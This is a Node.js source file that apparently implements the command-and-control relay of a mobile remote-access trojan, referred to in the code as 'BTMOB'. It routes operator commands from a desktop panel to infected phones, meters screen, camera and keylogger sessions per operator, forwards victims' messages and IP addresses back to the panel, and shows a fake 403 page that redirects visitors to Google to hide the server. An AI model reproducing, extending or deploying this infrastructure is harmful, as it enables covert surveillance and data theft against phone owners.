const { Console } = require("console");
const express = require("express");
const http = require("http");
const app = express();

const WebSocket = require("ws");

const server = http.createServer(app);

const wss = new WebSocket.Server({ port: 8080 });

const Authorized = new Map();

// Helper function to find idf by userid
function findIdfByUserId(userId) {
  for (let [idf, uid] of Authorized.entries()) {
    if (uid == userId) {
      return idf;
    }
  }
  return null; // Return null if userid is not found
}
function isValidIP(ip) {
  const ipv4Regex =
    /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  const ipv6Regex = /^[a-fA-F0-9:]+$/; // Basic IPv6 check
  return ipv4Regex.test(ip) || ipv6Regex.test(ip);
}
// Function to remove entry by userid
function Removeauth(userId) {
  const idf = findIdfByUserId(userId);
  if (idf !== null) {
    Authorized.delete(idf);
    console.log(`Removed Authorized with userid: ${userId} and idf: ${idf}`);

  } else {
    console.log(`User with userid: ${userId} not found`);
  }
}

const Userlimit_screen = new Map();
const Userlimit_cam = new Map();
const Userlimit_keylog = new Map();

const SolrUsers = new Map();

const SolrMobs = new Map();

const wsToPhoneId = new Map();

const idf_admin = "slr_panel";
const idf_client = "Slr_client";

const Alert_info = "Alert_info";
const Alert_success = "Alert_success";
const Alert_warning = "Alert_warning";
const Alert_error = "Alert_error";

const blocksmg = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<p>Redirecting in 5 seconds...</p>
<hr>

</body>

<script>
setTimeout(() => {
window.location.href = 'https://google.com';
}, 5000);
</script>
</html>
`;

// Function to add or update a user limit
function Addlimits(userId, maxAllowed, Userlimit) {
  maxAllowed = parseInt(maxAllowed, 10);
  if (isNaN(maxAllowed)) {
    console.log("Invalid maxAllowed value");
    return;
  }

  if (!Userlimit.has(userId)) {
    Userlimit.set(userId, { currentActive: 0, maxAllowed, mobIds: new Set() });
  } else {
    let user = Userlimit.get(userId);
    user.maxAllowed = maxAllowed;
    Userlimit.set(userId, user);
  }
}

// Function to increase the currentActive count for a user when a new mob connects
function AddActivemob(userId, mobId, Userlimit) {
  if (Userlimit.has(userId)) {
    let user = Userlimit.get(userId);
    if (user.mobIds.has(mobId)) {
      //console.log('MobId already exists for this user');
      return true;
    }
    if (user.currentActive < user.maxAllowed) {
      user.currentActive++;
      user.mobIds.add(mobId);
      Userlimit.set(userId, user);
      return true;
    } else {
      console.log(
        "currentActive has reached the maxAllowed limit for this user"
      );
    }
  } else {
    console.log("User not found");
  }
  return false;
}
// Function to decrease the currentActive count for a user when a mob disconnects
function RemoveActivemob(userId, mobId, Userlimit) {
  if (Userlimit.has(userId)) {
    let user = Userlimit.get(userId);
    if (user.mobIds.has(mobId)) {
      user.currentActive--;
      user.mobIds.delete(mobId);
      Userlimit.set(userId, user);
    } else {
      console.log("Mob not found for this user");
    }
  } else {
    console.log("User not found");
  }
}

// Function to remove a user
function RemoveLimits(userId, Userlimit) {
  if (Userlimit.has(userId)) {
    Userlimit.delete(userId);
    console.log(`User ${userId} removed from userMap`);
  } else {
    console.log("User not found");
  }
}

app.get("/", (req, res) => {
  res.send(blocksmg);
});

app.get("/auth", (req, res) => {
  try {
    var ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    if (ip != "127.0.0.1" && ip != "::1" && ip != "::ffff:127.0.0.1") {
      console.log("🚀 ~ Not Allow /auth ~ ip:", ip);
      res.send(blocksmg);
      return;
    }

    let data;
    try {
      const Packet = req.query.packet;
      data = JSON.parse(Packet);
    } catch (error) {
      console.error("Error parsing JSON:", error);
      res.status(400).send(blocksmg);
      return;
    }

    if (data.idf && data.subc && data.userId && data.itype && data.maxsub) {
      const subcommand = data.subc;
      const idf = data.idf;
      const userid = data.userId;
      const itype = data.itype;
      const maxmobs = data.maxsub;
      switch (itype) {
        case idf_admin:
          switch (subcommand) {
            case "join":
              //updated
              if (!Authorized.has(idf)) {
                Authorized.set(idf, new Map()); // Initialize Set for new userId
              }

              let useridfsmap = Authorized.get(idf);

              if (!useridfsmap.has(idf)) {
                console.log("BT vb.net client request join");
                console.log("request data:", data);

                useridfsmap.set(idf, userid); // Add idf to user's set
                Addlimits(userid, maxmobs, Userlimit_screen);
                Addlimits(userid, maxmobs, Userlimit_cam);

                let maxAllowed = parseInt(maxmobs, 10) + 5;
                Addlimits(userid, maxAllowed.toString(), Userlimit_keylog);
              }

              res.json({ state: "ok" });
              break;

            case "out":
              if (Authorized.has(idf)) {
                let useridfsmap = Authorized.get(idf);

                // Check if this idf is in the sub-map
                if (useridfsmap.has(idf)) {
                  console.log("BT vb.net client request out");
                  console.log("request data:", data);

                  // Remove this idf from the sub-map
                  useridfsmap.delete(idf);

                  // If the sub-map is now empty, remove it from Authorized entirely
                  if (useridfsmap.size === 0) {
                    Authorized.delete(idf);
                  }

                  res.json({ state: "closed" });
                } else {
                  // If the sub-map doesn't have this idf, respond accordingly
                  res.json({ state: "not_found" });
                }
              } else {
                // If there’s no entry in Authorized for this idf at all
                res.json({ state: "not_found" });
              }
              break;
            default:
              console.log("Invalid request !!! (3)");
              break;
          }
          break;
      }
    }
  } catch (error) {
    console.error("Error handling message:", error);
  }
});

wss.on("connection", (ws) => {
  console.log("Client connected");

  ws.on("message", (message) => {
    try {
      let data;
      try {
        data = JSON.parse(message);
      } catch (error) {
        console.error("Error parsing JSON:", error);
        const jsonData = {
          type: "Unauthorized access",
        };

        const chatdata = JSONIT(jsonData);
        ws.send(chatdata);
        ws.terminate();
        return;
      }

      if (data.idf && data.subc) {
        const subcommand = data.subc;
        if (!Authorized.has(data.idf)) {
          const jsonData = {
            type: "Unauthorized access",
          };

          const chatdata = JSONIT(jsonData);
          ws.send(chatdata);
          ws.terminate();
          return;
        }

        const useridfsmap = Authorized.get(data.idf);
        if (!useridfsmap.has(data.idf)) {
          const jsonData = {
            type: "Unauthorized access 2",
          };

          const chatdata = JSONIT(jsonData);
          ws.send(chatdata);
          ws.terminate();
          return;
        }
        const userid = useridfsmap.get(data.idf);

        switch (data.itype) {
          ///////////////////////
          // Below form VB.net (PC slr_panel)
          ///////////////////////

          case idf_admin:
            switch (subcommand) {
              case "join":
                console.log("New BT vb.net client connectd:", data);

                if (!SolrUsers.has(userid)) {
                  SolrUsers.set(userid, new Map());
                }

                let usersockmap = SolrUsers.get(userid);

                usersockmap.set(data.idf, ws);

                break;

              case "out":
                console.log("This is a BT vb.net client close: ", data);

                if (SolrUsers.has(userid)) {
                  // Retrieve the user's map of sockets
                  const usersockmap = SolrUsers.get(userid);

                  // Check if there's a socket associated with `data.idf`
                  if (usersockmap.has(data.idf)) {
                    // Get that specific socket
                    const usersocket = usersockmap.get(data.idf);

                    // If it is open, terminate
                    if (
                      usersocket &&
                      usersocket.readyState === WebSocket.OPEN
                    ) {
                      usersocket.terminate();
                    }

                    // Remove this particular socket from the user's map
                    usersockmap.delete(data.idf);
                  }

                  // If that was the last socket, remove the user entirely
                  if (usersockmap.size === 0) {
                    SolrUsers.delete(userid);
                  }
                }
                break;

              case "com": //command
                const mobpid = data.pid;
                const datatopass = data.pdata;

                const MobReciver = SolrMobs.get(mobpid);
                if (!MobReciver || MobReciver.readyState != WebSocket.OPEN) {
                  //alertpanel(ws, "this client is not connected", Alert_info);
                  return;
                }
                const jsonData = {
                  type: "com",
                  pdata: datatopass,
                };
                const msgdata = JSONIT(jsonData);

                MobReciver.send(msgdata);
                break;
              default:
                console.log("Invalid request !!! (3)");
                break;
            }
            break;

          ///////////////////////
          // Below form Clients (Mobile)
          ///////////////////////

          case idf_client:
            let usersockmap = SolrUsers.get(userid);

            let FrontReciver;

            if (usersockmap && data.sidf && data.sidf !== "null") {
              FrontReciver = usersockmap.get(data.sidf);
            }

            if (!FrontReciver || FrontReciver.readyState != WebSocket.OPEN) {
              if (usersockmap){
                FrontReciver = usersockmap.get(data.idf);
              }
            } 

            if (!FrontReciver || FrontReciver.readyState != WebSocket.OPEN) {
              console.log("🚀 ~ ws.on ~ userid:", userid);
              const stopjson = {
                type: "stop",
              };

              const stopit = JSONIT(stopjson);
              ws.send(stopit);
              ws.terminate();
              return;
            }

            switch (subcommand) {
              case "join":
                console.log("New Mob connectd:", data);
                let phoneid = data.pid;
                SolrMobs.set(phoneid, ws);
                wsToPhoneId.set(ws, phoneid);
                const joindata = {
                  type: "connected",
                };

                const chatdata = JSONIT(joindata);

                ws.send(chatdata);
                break;
              case "msg":
                let clientaddress = data.cip || "null";
                let Ckey = data.conk || "BTMOB";

                if (!clientaddress || clientaddress === "null") {
                  clientaddress = ws._socket?.remoteAddress || "";

                  if (clientaddress.startsWith("::ffff:")) {
                    clientaddress = clientaddress.replace(/^::ffff:/, "");
                  }

                  const forwardedFor =
                    ws._socket?.handshake?.headers?.["x-forwarded-for"];

                  if (forwardedFor || clientaddress.length === 0) {
                    const forwardedIPs = forwardedFor
                      .split(",")
                      .map((ip) => ip.trim());
                    clientaddress = forwardedIPs[0];
                  }
                }

                //console.log("Client IP Address:", clientaddress);

                const jsonData = {
                  type: "msg",
                  data: data.msg,
                  cip: clientaddress,
                  cokey: Ckey,
                  pid: data.pid,
                };

                const jsonString = JSONIT(jsonData);

                FrontReciver.send(jsonString);
                break;

              default:
                console.log("Invalid request !!! (2)");
                break;
            }
            break;

          default:
            console.log("Invalid request !!! (1)");
            break;
        }
      }
    } catch (error) {
      console.error("Error handling message:", error);
    }
  });

  ws.on("close", () => {
    console.log("Client disconnected");

    const phoneId = wsToPhoneId.get(ws);
    if (phoneId) {
      console.log("disconnected Mobile:");
      SolrMobs.delete(phoneId);
      wsToPhoneId.delete(ws); // Clean up the mapping
    }


    for (const usersockmap of SolrUsers.entries()) {
      for (const [userId, client] of usersockmap.entries()) {
        if (client === ws) {
          Removeauth(userId);
          if (phoneId) {
            RemoveActivemob(userId, phoneId, Userlimit_cam);
            RemoveActivemob(userId, phoneId, Userlimit_keylog);
            RemoveActivemob(userId, phoneId, Userlimit_screen);
          }
          SolrUsers.delete(userId);
          break;
        }
      }
    }
  });
});

const PORT = process.env.PORT || 3000;
console.log("🚀 ~ PORT:", PORT);
server.listen(PORT, () => {
  console.log(`Http on port ${PORT}`);
});

console.log("WebSocket on port 8080");

function JSONIT(params) {
  return JSON.stringify(params);
}

function isValidTitle(title) {
  const regex = /^[a-zA-Z0-9]+$/;

  if (regex.test(title) && title.length <= 16) {
    return true;
  } else {
    return false;
  }
}

function alertpanel(frontws, msg, alert) {
  const jsonData = {
    type: "notify",
    pid: "ALERTER",
    meth: alert,
    data: msg,
  };

  const jsonString = JSONIT(jsonData);

  frontws.send(jsonString);
}
